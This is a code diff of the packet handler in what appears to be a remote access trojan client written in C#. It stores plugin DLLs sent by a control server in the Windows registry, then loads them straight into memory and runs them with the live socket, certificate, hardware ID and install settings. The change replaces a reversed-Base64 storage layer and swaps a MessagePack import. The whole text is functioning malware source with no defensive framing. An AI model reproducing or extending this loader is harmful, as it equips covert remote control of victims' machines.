@@ -1,14 +1,13 @@
 ﻿using Client.Algorithm;
 using Client.Helper;
-using Client.MessagePack;
 using Client.Connection;
 using System;
 using System.Diagnostics;
 using System.Reflection;
 using System.Threading;
 using System.Collections.Generic;
-using Microsoft.VisualBasic;
 using System.Linq;
+using MessagePackLib.MessagePack;
 
 namespace Client.Handle_Packet
 {
@@ -57,7 +56,7 @@ namespace Client.Handle_Packet
 
                     case "savePlugin": // save plugin as MD5:Base64
                         {
-                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").AsString);
+                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                             Debug.WriteLine("plugin saved");
                             foreach (MsgPack msgPack in Packs.ToList())
                             {
@@ -79,7 +78,7 @@ namespace Client.Handle_Packet
 
         private static void Invoke(MsgPack unpack_msgpack)
         {
-            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)))));
+            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
             Type type = assembly.GetType("Plugin.Plugin");
             dynamic instance = Activator.CreateInstance(type);
             instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
